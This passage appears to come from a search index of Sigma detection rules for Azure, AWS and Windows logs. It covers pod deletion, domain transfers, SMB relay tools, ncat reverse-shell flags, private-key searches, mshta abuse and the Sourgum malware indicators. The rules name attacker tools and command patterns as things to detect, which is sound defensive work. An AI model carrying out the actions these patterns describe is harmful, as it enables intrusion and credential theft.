azure.activitylogs detection: selection_operation_name: properties.message: MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/PODS/DELETE condition: selection_operation_name level: medium tags: - attack.impact falsepositives: - Pods may be deleted by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Pods deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_pods_deleted.yml/","tags":["attack.impact"],"title":"Azure Kubernetes Pods Deleted"},{"categories":null,"contents":"Detects when Events are deleted in Azure Kubernetes. An adversary may delete events in Azure Kubernetes in an attempt to evade detection.\nKnown false-positives Event deletions may be done by a system or network administrator. Verify whether the username, hostname, and/or resource name should be making changes in your environment. Events deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://github.com/elastic/detection-rules/blob/da3852b681cf1a33898b1535892eab1f3a76177a/rules/integrations/azure/defense_evasion_kubernetes_events_deleted.toml Raw rule (edit) title: Azure Kubernetes Events Deleted id: 225d8b09-e714-479c-a0e4-55e6f29adf35 description: Detects when Events are deleted in Azure Kubernetes. An adversary may delete events in Azure Kubernetes in an attempt to evade detection. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://github.com/elastic/detection-rules/blob/da3852b681cf1a33898b1535892eab1f3a76177a/rules/integrations/azure/defense_evasion_kubernetes_events_deleted.toml logsource: product: azure service: azure.activitylogs detection: selection_operation_name: properties.message: MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/EVENTS.K8S.IO/EVENTS/DELETE condition: selection_operation_name level: medium tags: - attack.defense_evasion - attack.t1562 - attack.t1562.001 falsepositives: - Event deletions may be done by a system or network administrator. Verify whether the username, hostname, and/or resource name should be making changes in your environment. Events deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_events_deleted.yml/","tags":["attack.defense_evasion","attack.t1562","attack.t1562.001"],"title":"Azure Kubernetes Events Deleted"},{"categories":null,"contents":"Identifies when an ElastiCache security group has been modified or deleted.\nKnown false-positives A ElastiCache security group deletion may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security Group deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://github.com/elastic/detection-rules/blob/7d5efd68603f42be5e125b5a6a503b2ef3ac0f4e/rules/integrations/aws/impact_elasticache_security_group_modified_or_deleted.toml Raw rule (edit) title: AWS ElastiCache Security Group Modified or Deleted id: 7c797da2-9cf2-4523-ba64-33b06339f0cc description: Identifies when an ElastiCache security group has been modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 modified: 2021/08/19 references: - https://github.com/elastic/detection-rules/blob/7d5efd68603f42be5e125b5a6a503b2ef3ac0f4e/rules/integrations/aws/impact_elasticache_security_group_modified_or_deleted.toml logsource: product: aws service: cloudtrail detection: selection: eventSource: elasticache.amazonaws.com eventName: - \u0026#39;DeleteCacheSecurityGroup\u0026#39; - \u0026#39;AuthorizeCacheSecurityGroupIngress\u0026#39; - \u0026#39;RevokeCacheSecurityGroupIngress\u0026#39; - \u0026#39;AuthorizeCacheSecurityGroupEgress\u0026#39; - \u0026#39;RevokeCacheSecurityGroupEgress\u0026#39; condition: selection level: low tags: - attack.impact - attack.t1531 falsepositives: - A ElastiCache security group deletion may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security Group deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_elasticache_security_group_modified_or_deleted.yml/","tags":["attack.impact","attack.t1531"],"title":"AWS ElastiCache Security Group Modified or Deleted"},{"categories":null,"contents":"Detects when an ElastiCache security group has been created.\nKnown false-positives A ElastiCache security group may be created by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security group creations from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://github.com/elastic/detection-rules/blob/598f3d7e0a63221c0703ad9a0ea7e22e7bc5961e/rules/integrations/aws/persistence_elasticache_security_group_creation.toml Raw rule (edit) title: AWS ElastiCache Security Group Created id: 4ae68615-866f-4304-b24b-ba048dfa5ca7 description: Detects when an ElastiCache security group has been created. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 modified: 2021/08/19 references: - https://github.com/elastic/detection-rules/blob/598f3d7e0a63221c0703ad9a0ea7e22e7bc5961e/rules/integrations/aws/persistence_elasticache_security_group_creation.toml logsource: product: aws service: cloudtrail detection: selection: eventSource: elasticache.amazonaws.com eventName: \u0026#39;CreateCacheSecurityGroup\u0026#39; condition: selection level: low tags: - attack.persistence - attack.t1136 - attack.t1136.003 falsepositives: - A ElastiCache security group may be created by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security group creations from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_elasticache_security_group_created.yml/","tags":["attack.persistence","attack.t1136","attack.t1136.003"],"title":"AWS ElastiCache Security Group Created"},{"categories":null,"contents":"Detects different hacktools used for relay attacks on Windows for privilege escalation\nKnown false-positives Legitimate files with these rare hacktool names References https://attack.mitre.org/techniques/T1557/001/ https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ https://pentestlab.blog/2017/04/13/hot-potato/ https://github.com/ohpe/juicy-potato https://hunter2.gitbook.io/darthsidious/other/war-stories/domain-admin-in-30-minutes https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire Raw rule (edit) title: SMB Relay Attack Tools status: test id: 5589ab4f-a767-433c-961d-c91f3f704db1 description: Detects different hacktools used for relay attacks on Windows for privilege escalation author: Florian Roth date: 2021/07/24 modified: 2022/03/03 references: - https://attack.mitre.org/techniques/T1557/001/ - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ - https://pentestlab.blog/2017/04/13/hot-potato/ - https://github.com/ohpe/juicy-potato - https://hunter2.gitbook.io/darthsidious/other/war-stories/domain-admin-in-30-minutes - https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire tags: - attack.execution - attack.t1557.001 logsource: category: process_creation product: windows detection: selection_pe: Image|contains: - \u0026#39;PetitPotam\u0026#39; - \u0026#39;RottenPotato\u0026#39; - \u0026#39;HotPotato\u0026#39; - \u0026#39;JuicyPotato\u0026#39; - \u0026#39;\\just_dce_\u0026#39; - \u0026#39;Juicy Potato\u0026#39; - \u0026#39;\\temp\\rot.exe\u0026#39; - \u0026#39;\\Potato.exe\u0026#39; - \u0026#39;\\SpoolSample.exe\u0026#39; - \u0026#39;\\Responder.exe\u0026#39; - \u0026#39;\\smbrelayx\u0026#39; - \u0026#39;\\ntlmrelayx\u0026#39; selection_script: CommandLine|contains: - \u0026#39;Invoke-Tater\u0026#39; - \u0026#39; smbrelay\u0026#39; - \u0026#39; ntlmrelay\u0026#39; - \u0026#39;cme smb \u0026#39; - \u0026#39; /ntlm:NTLMhash \u0026#39; - \u0026#39;Invoke-PetitPotam\u0026#39; filter_hotpotatoes: # known goodware https://hotpot.uvic.ca/ Image|contains: - \u0026#39;HotPotatoes6\u0026#39; - \u0026#39;HotPotatoes 6\u0026#39; - \u0026#39;HotPotatoes7\u0026#39; - \u0026#39;HotPotatoes 7\u0026#39; - \u0026#39;HotPotatoes Help\u0026#39; - \u0026#39;HotPotatoes Tutorial\u0026#39; condition: 1 of selection_* and not 1 of filter_* falsepositives: - Legitimate files with these rare hacktool names level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_tools_relay_attacks.yml/","tags":["attack.execution","attack.t1557.001"],"title":"SMB Relay Attack Tools"},{"categories":null,"contents":"Detects when a transfer lock was removed from a Route 53 domain. It is recommended to refrain from performing this action unless intending to transfer the domain to a different registrar.\nKnown false-positives A domain transfer lock may be disabled by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Activity from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/persistence_route_53_domain_transfer_lock_disabled.toml https://docs.aws.amazon.com/Route53/latest/APIReference/API_Operations_Amazon_Route_53.html https://docs.aws.amazon.com/Route53/latest/APIReference/API_domains_DisableDomainTransferLock.html Raw rule (edit) title: AWS Route 53 Domain Transfer Lock Disabled id: 3940b5f1-3f46-44aa-b746-ebe615b879e0 description: Detects when a transfer lock was removed from a Route 53 domain. It is recommended to refrain from performing this action unless intending to transfer the domain to a different registrar. author: Elastic, Austin Songer @austinsonger status: experimental date: 2021/07/22 references: - https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/persistence_route_53_domain_transfer_lock_disabled.toml - https://docs.aws.amazon.com/Route53/latest/APIReference/API_Operations_Amazon_Route_53.html - https://docs.aws.amazon.com/Route53/latest/APIReference/API_domains_DisableDomainTransferLock.html logsource: product: aws service: cloudtrail detection: selection: eventSource: route53.amazonaws.com eventName: DisableDomainTransferLock condition: selection level: low tags: - attack.persistence - attack.credential_access - attack.t1098 falsepositives: - A domain transfer lock may be disabled by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Activity from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_route_53_domain_transferred_lock_disabled.yml/","tags":["attack.persistence","attack.credential_access","attack.t1098"],"title":"AWS Route 53 Domain Transfer Lock Disabled"},{"categories":null,"contents":"Detects when a request has been made to transfer a Route 53 domain to another AWS account.\nKnown false-positives A domain may be transferred to another AWS account by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Domain transfers from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/persistence_route_53_domain_transferred_to_another_account.toml Raw rule (edit) title: AWS Route 53 Domain Transferred to Another Account id: b056de1a-6e6e-4e40-a67e-97c9808cf41b description: Detects when a request has been made to transfer a Route 53 domain to another AWS account. author: Elastic, Austin Songer @austinsonger status: experimental date: 2021/07/22 references: - https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/persistence_route_53_domain_transferred_to_another_account.toml logsource: product: aws service: cloudtrail detection: selection: eventSource: route53.amazonaws.com eventName: TransferDomainToAnotherAwsAccount condition: selection tags: - attack.persistence - attack.credential_access - attack.t1098 falsepositives: - A domain may be transferred to another AWS account by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Domain transfers from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_route_53_domain_transferred_to_another_account.yml/","tags":["attack.persistence","attack.credential_access","attack.t1098"],"title":"AWS Route 53 Domain Transferred to Another Account"},{"categories":null,"contents":"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/T1114.001.md Raw rule (edit) title: Powershell Local Email Collection id: 2837e152-93c8-43d2-85ba-c3cd3c2ae614 status: experimental author: frack113 date: 2021/07/21 modified: 2021/10/16 description: Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114.001/T1114.001.md tags: - attack.collection - attack.t1114.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - \u0026#39;Get-Inbox.ps1\u0026#39; - \u0026#39;Microsoft.Office.Interop.Outlook\u0026#39; - \u0026#39;Microsoft.Office.Interop.Outlook.olDefaultFolders\u0026#39; - \u0026#39;-comobject outlook.application\u0026#39; condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_mail_acces.yml/","tags":["attack.collection","attack.t1114.001"],"title":"Powershell Local Email Collection"},{"categories":null,"contents":"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network\nKnown false-positives Unknown References https://nmap.org/ncat/ https://github.com/besimorhino/powercat https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md Raw rule (edit) title: Netcat The Powershell Version id: bf7286e7-c0be-460b-a7e8-5b2e07ecc2f2 status: experimental author: frack113 date: 2021/07/21 modified: 2021/10/16 description: Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network references: - https://nmap.org/ncat/ - https://github.com/besimorhino/powercat - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md tags: - attack.command_and_control - attack.t1095 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: ContextInfo|contains: - \u0026#39;powercat \u0026#39; - \u0026#39;powercat.ps1\u0026#39; condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_module/posh_pm_powercat.yml/","tags":["attack.command_and_control","attack.t1095"],"title":"Netcat The Powershell Version"},{"categories":null,"contents":"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network\nKnown false-positives Legitimate ncat use References https://nmap.org/ncat/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md Raw rule (edit) title: Ncat Execution id: e31033fc-33f0-4020-9a16-faf9b31cbf08 status: experimental author: frack113, Florian Roth date: 2021/07/21 modified: 2022/02/23 description: Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network references: - https://nmap.org/ncat/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md tags: - attack.command_and_control - attack.t1095 logsource: category: process_creation product: windows detection: selection: # can not use OriginalFileName as is empty Image|endswith: - \u0026#39;\\ncat.exe\u0026#39; - \u0026#39;\\netcat.exe\u0026#39; selection_cmdline: # Typical command lines CommandLine|contains: - \u0026#39; -lvp \u0026#39; - \u0026#39; -l -v -p \u0026#39; - \u0026#39; -lv -p \u0026#39; - \u0026#39; -l --proxy-type http \u0026#39; - \u0026#39; --exec cmd.exe \u0026#39; - \u0026#39; -vnl --exec \u0026#39; condition: selection or selection_cmdline falsepositives: - Legitimate ncat use level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_netcat_execution.yml/","tags":["attack.command_and_control","attack.t1095"],"title":"Ncat Execution"},{"categories":null,"contents":"Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.md Raw rule (edit) title: Zip A Folder With PowerShell For Staging In Temp id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9 status: experimental author: frack113 date: 2021/07/20 modified: 2021/10/16 description: Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.md tags: - attack.collection - attack.t1074.001 logsource: product: windows category: ps_script definition: Script Block Logging must be enable detection: selection_4104: ScriptBlockText|contains|all: - \u0026#39;Compress-Archive \u0026#39; - \u0026#39; -Path \u0026#39; - \u0026#39; -DestinationPath \u0026#39; - \u0026#39;$env:TEMP\\\u0026#39; condition: selection_4104 falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_susp_zip_compress.yml/","tags":["attack.collection","attack.t1074.001"],"title":"Zip A Folder With PowerShell For Staging In Temp"},{"categories":null,"contents":"Adversaries may search for private key certificate files on compromised systems for insecurely stored credential\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md Raw rule (edit) title: Discover Private Keys id: 213d6a77-3d55-4ce8-ba74-fcfef741974e status: experimental author: frack113 date: 2021/07/20 description: Adversaries may search for private key certificate files on compromised systems for insecurely stored credential references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md tags: - attack.credential_access - attack.t1552.004 logsource: category: process_creation product: windows detection: selection_exe: CommandLine|contains: - \u0026#39;dir \u0026#39; - \u0026#39;findstr \u0026#39; selection_ext: CommandLine|contains: - \u0026#39;.key\u0026#39; - \u0026#39;.pgp\u0026#39; - \u0026#39;.gpg\u0026#39; - \u0026#39;.ppk\u0026#39; - \u0026#39;.p12\u0026#39; - \u0026#39;.pem\u0026#39; - \u0026#39;.pfx\u0026#39; - \u0026#39;.cer\u0026#39; - \u0026#39;.p7b\u0026#39; - \u0026#39;.asc\u0026#39; condition: selection_exe and selection_ext fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_discover_private_keys.yml/","tags":["attack.credential_access","attack.t1552.004"],"title":"Discover Private Keys"},{"categories":null,"contents":"Detects suspicious mshta process patterns\nKnown false-positives Unknown References https://en.wikipedia.org/wiki/HTML_Application https://www.echotrail.io/insights/search/mshta.exe https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/ Raw rule (edit) title: Suspicious MSHTA Process Patterns id: e32f92d1-523e-49c3-9374-bdb13b46a3ba status: experimental description: Detects suspicious mshta process patterns references: - https://en.wikipedia.org/wiki/HTML_Application - https://www.echotrail.io/insights/search/mshta.exe - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/ tags: - attack.execution - attack.t1106 author: Florian Roth date: 2021/07/17 logsource: category: process_creation product: windows detection: # Binary Selector selection_base: Image|endswith: \u0026#39;\\mshta.exe\u0026#39; # Suspicious parents selection1: ParentImage|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; # Suspicious folders selection2: CommandLine|contains: - \u0026#39;\\AppData\\Local\u0026#39; - \u0026#39;C:\\Windows\\Temp\u0026#39; - \u0026#39;C:\\Users\\Public\u0026#39; # Suspicious Execution Locations filter3: Image|contains: - \u0026#39;C:\\Windows\\System32\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\u0026#39; # Suspicious extensions filter4: CommandLine|contains: - \u0026#39;.htm\u0026#39; - \u0026#39;.hta\u0026#39; CommandLine|endswith: - \u0026#39;mshta.exe\u0026#39; - \u0026#39;mshta\u0026#39; condition: selection_base and ( selection1 or selection2 ) or ( selection_base and not filter3 ) or ( selection_base and not filter4 ) falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_mshta_pattern.yml/","tags":["attack.execution","attack.t1106"],"title":"Suspicious MSHTA Process Patterns"},{"categories":null,"contents":"Detects a regsvr.exe execution that doesn\u0026rsquo;t contain a DLL in the command line\nKnown false-positives Unknown References https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/ Raw rule (edit) title: Regsvr32 Command Line Without DLL id: 50919691-7302-437f-8e10-1fe088afa145 status: experimental description: Detects a regsvr.exe execution that doesn\u0026#39;t contain a DLL in the command line author: Florian Roth date: 2019/07/17 modified: 2021/10/19 references: - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/ tags: - attack.defense_evasion - attack.t1574 - attack.execution logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; filter: CommandLine|contains: - \u0026#39;.dll\u0026#39; - \u0026#39;.ocx\u0026#39; - \u0026#39;.cpl\u0026#39; - \u0026#39;.ax\u0026#39; - \u0026#39;.bav\u0026#39; - \u0026#39;.ppl\u0026#39; filter_null1_for_4688: CommandLine: null filter_null2_for_4688: CommandLine: \u0026#39;\u0026#39; condition: selection and not filter and not filter_null1_for_4688 and not filter_null2_for_4688 fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_regsvr32_no_dll.yml/","tags":["attack.defense_evasion","attack.t1574","attack.execution"],"title":"Regsvr32 Command Line Without DLL"},{"categories":null,"contents":"Detects patterns as noticed in exploitation of Windows CVE-2021-31979 CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum\nKnown false-positives Unlikely References https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/ https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/ Raw rule (edit) title: CVE-2021-31979 CVE-2021-33771 Exploits by Sourgum id: ad7085ac-92e4-4b76-8ce2-276d2c0e68ef status: experimental description: Detects patterns as noticed in exploitation of Windows CVE-2021-31979 CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum author: Sittikorn S date: 2021/07/16 modified: 2021/09/09 references: - https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/ - https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/ tags: - attack.credential_access - attack.t1566 - attack.t1203 - cve.2021.33771 - cve.2021.31979 # - threat_group.Sourgum logsource: product: windows category: file_event detection: selection: TargetFilename|contains: - \u0026#39;C:\\Windows\\system32\\physmem.sys\u0026#39; - \u0026#39;C:\\Windows\\System32\\IME\\IMEJP\\imjpueact.dll\u0026#39; - \u0026#39;C:\\Windows\\system32\\ime\\IMETC\\IMTCPROT.DLL\u0026#39; - \u0026#39;C:\\Windows\\system32\\ime\\SHARED\\imecpmeid.dll\u0026#39; - \u0026#39;C:\\Windows\\system32\\config\\spp\\ServiceState\\Recovery\\pac.dat\u0026#39; - \u0026#39;C:\\Windows\\system32\\config\\cy-GB\\Setup\\SKB\\InputMethod\\TupTask.dat\u0026#39; - \u0026#39;C:\\Windows\\system32\\config\\config\\startwus.dat\u0026#39; - \u0026#39;C:\\Windows\\system32\\ime\\SHARED\\WimBootConfigurations.ini\u0026#39; - \u0026#39;C:\\Windows\\system32\\ime\\IMEJP\\WimBootConfigurations.ini\u0026#39; - \u0026#39;C:\\Windows\\system32\\ime\\IMETC\\WimBootConfigurations.ini\u0026#39; condition: selection falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_cve_2021_31979_cve_2021_33771_exploits.yml/","tags":["attack.credential_access","attack.t1566","attack.t1203","cve.2021.33771","cve.2021.31979"],"title":"CVE-2021-31979 CVE-2021-33771 Exploits by Sourgum"},{"categories":null,"contents":"Detects patterns as noticed in exploitation of Windows CVE-2021-31979 CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum\nKnown false-positives Unlikely References https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/ https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/ Raw rule (edit) title: CVE-2021-31979 CVE-2021-33771 Exploits by Sourgum id: 32b5db62-cb5f-4266-9639-0fa48376ac00 status: experimental description: Detects patterns as noticed in exploitation of Windows CVE-2021-31979 CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum author: Sittikorn S date: 2021/07/16 modified: 2021/09/09 references: - https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/ - https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/ tags: - attack.credential_access - attack.t1566 - attack.t1203 - cve.2021.33771 - cve.2021.31979 # - threat_group.Sourgum logsource: product: windows category: registry_event detection: selection: TargetObject|contains: - \u0026#39;\\Software\\Classes\\CLSID\\{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}\\InprocServer32\u0026#39; - \u0026#39;\\SOFTWARE\\Classes\\CLSID\\{7C857801-7381-11CF-884D-00AA004B2E24}\\InProcServer32\u0026#39; keywords: - IMJPUEXP.DLL condition: selection and keywords falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_cve_2021_31979_cve_2021_33771_exploits.yml/","tags":["attack.credential_access","attack.t1566","attack.t1203","cve.2021.33771","cve.2021.31979"],"title":"CVE-2021-31979 CVE-2021-33771 Exploits by Sourgum"},{"categories":null,"contents":"Suspicious behaviours related to an actor tracked by Microsoft as SOURGUM\nKnown false-positives Unknown References https://www.virustotal.com/gui/file/c299063e3eae8ddc15839767e83b9808fd43418dc5a1af7e4f44b97ba53fbd3d/detection https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/SOURGUM_IOC.yaml https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/ Raw rule (edit) title: SOURGUM Actor Behaviours id: 7ba08e95-1e0b-40cd-9db5-b980555e42fd description: Suspicious behaviours related to an actor tracked by Microsoft as SOURGUM author: MSTIC, FPT.EagleEye status: experimental level: high references: - https://www.virustotal.com/gui/file/c299063e3eae8ddc15839767e83b9808fd43418dc5a1af7e4f44b97ba53fbd3d/detection - https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/SOURGUM_IOC.yaml - https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/ date: 2021/06/15 modified: 2021/07/30 tags: - attack.t1546 - attack.t1546.015 - attack.persistence - attack.privilege_escalation logsource: product: windows category: process_creation detection: selection1: Image|contains: \u0026#39;windows\\system32\\Physmem.sys\u0026#39; selection2: Image|contains: - \u0026#39;Windows\\system32\\ime\\SHARED\\WimBootConfigurations.ini\u0026#39; - \u0026#39;Windows\\system32\\ime\\IMEJP\\WimBootConfigurations.ini\u0026#39; - \u0026#39;Windows\\system32\\ime\\IMETC\\WimBootConfigurations.ini\u0026#39; selection3: Image|contains: - \u0026#39;windows\\system32\\filepath2\u0026#39; - \u0026#39;windows\\system32\\ime\u0026#39; registry_command: CommandLine|contains: - \u0026#39;reg add\u0026#39; registry_key: CommandLine|contains: - \u0026#39;HKEY_LOCAL_MACHINE\\software\\classes\\clsid\\{7c857801-7381-11cf-884d-00aa004b2e24}\\inprocserver32\u0026#39; - \u0026#39;HKEY_LOCAL_MACHINE\\software\\classes\\clsid\\{cf4cc405-e2c5-4ddd-b3ce-5e7582d8c9fa}\\inprocserver32\u0026#39; condition: selection1 or selection2 or (selection3 and registry_command and registry_key) falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_sourgrum.yml/","tags":["attack.t1546","attack.t1546.015","attack.persistence","attack.privilege_escalation"],"title":"SOURGUM Actor Behaviours"},{"categories":null,"contents":"Detects execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7\nKnown false-positives Unknown References https://github.com/sense-of-security/ADRecon https://bi-zone.medium.com/from-pentest-to-apt-attack-cybercriminal-group-fin7-disguises-its-malware-as-an-ethical-hackers-c23c9a75e319 Raw rule (edit) title: PowerShell ADRecon Execution id: bf72941a-cba0-41ea-b18c-9aca3925690d status: experimental description: Detects execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7 references: - https://github.com/sense-of-security/ADRecon - https://bi-zone.medium.com/from-pentest-to-apt-attack-cybercriminal-group-fin7-disguises-its-malware-as-an-ethical-hackers-c23c9a75e319 tags: - attack.discovery - attack.execution - attack.t1059.001 author: Bhabesh Raj date: 2021/07/16 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - \u0026#39;Function Get-ADRExcelComOb\u0026#39; - \u0026#39;ADRecon-Report.xlsx\u0026#39; #Default condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_adrecon_execution.yml/","tags":["attack.discovery","attack.execution","attack.t1059.001"],"title":"PowerShell ADRecon Execution"},{"categories":null,"contents":"Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/ Raw rule (edit) title: SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code id: 36475a7d-0f6d-4dce-9b01-6aeb473bbaf1 status: experimental author: frack113 date: 2021/07/16 modified: 2022/01/24 description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md - https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/ tags: - attack.defense_evasion - attack.t1218 - attack.t1216 logsource: category: process_creation product: windows detection: select_vbs: CommandLine|contains|all: - \u0026#39;\\SyncAppvPublishingServer.vbs\u0026#39; - \u0026#39;\u0026#34;\\n;\u0026#39; condition: select_vbs fields: - ComputerName - User - CommandLine - ParentCommandLine 